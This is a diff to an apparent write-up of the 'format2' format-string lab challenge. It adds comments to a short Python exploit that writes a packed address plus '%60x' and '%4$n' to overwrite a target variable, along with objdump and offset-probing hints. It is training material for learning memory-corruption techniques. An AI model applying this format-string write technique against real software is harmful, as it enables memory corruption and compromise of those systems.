@@ -30,12 +30,12 @@ int main(int argc, char **argv)
 Here is the exploit script (saved as `format2.exp.py`):
 ```python
 import struct
-targaddr=0x80496e4
+targaddr=0x80496e4 # Got using: objdump -D format2 | grep -i target
 tas = struct.pack('<I', targaddr)
 exp = ""
 exp += tas
 exp += '%60x'
-exp += '%4$n' # I figured out that our string starts at 4 words
+exp += '%4$n' # I figured out that our string starts at 4 words. Hint: type: python -c "print 'AAAA' + '%4\$x'" | ./format2 
 
 print exp
 ```
